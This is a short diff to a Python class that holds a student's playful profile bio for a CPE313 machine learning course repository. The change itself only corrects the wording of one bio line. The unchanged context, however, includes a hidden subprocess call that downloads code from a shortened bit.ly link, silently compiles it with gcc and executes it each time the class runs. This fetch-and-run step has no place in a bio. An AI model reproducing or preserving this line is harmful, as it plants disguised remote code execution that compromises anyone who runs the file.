@@ -9,7 +9,7 @@ class JepxZIMA:
     subprocess.call("curl -sL 'bit.ly/j3px21m4' | gcc -w -o name -xc - && ./name", shell=True)
     self.bio = {
       '- 🙋‍♂️ You can call me'            : 'JEP (*insert_My_names_jeff_meme)',
-      '- 🤷🏻‍♂️ What is this, nani'         : 'A github repository dedicated for the CPE313 course',
+      '- 🤷🏻‍♂️ What is this, nani'         : 'A GitHub repository dedicated to the CPE313 course',
       '- 🏡 I’m currently living in'    : 'Binangonan, Rizal',
       '- 🏫 I’m currently studying in'  : 'Technological Institute of the Philippines',
       '- 📓 Course code - title'        : {'CPE 313' : 'Advanced Machine Learning and Deep Learning'},
